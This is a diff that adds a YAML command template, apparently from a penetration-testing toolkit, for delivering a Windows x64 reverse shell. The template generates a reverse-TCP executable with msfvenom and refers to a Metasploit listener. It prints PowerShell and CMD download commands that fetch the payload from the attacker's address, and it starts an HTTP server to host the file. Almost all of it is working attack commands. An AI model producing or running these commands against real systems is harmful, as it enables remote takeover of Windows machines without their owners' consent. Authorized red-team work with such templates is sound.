@@ -1,0 +1,21 @@
+---
+metadata:
+  filename: "deliver-windows-x64-revshell-msfvenom-staged-exe.yaml"
+  tags: ["shell", "windows"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \
+  echo '================================================================'; \
+  echo '                      ------Listener------                      '; \
+  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-nonstaged.yaml') }}'; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
+  echo '================================================================'; \
+  echo '                         -----CMD-----                          '; \
+  echo 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_inbound_port }} -d packstation/outbound
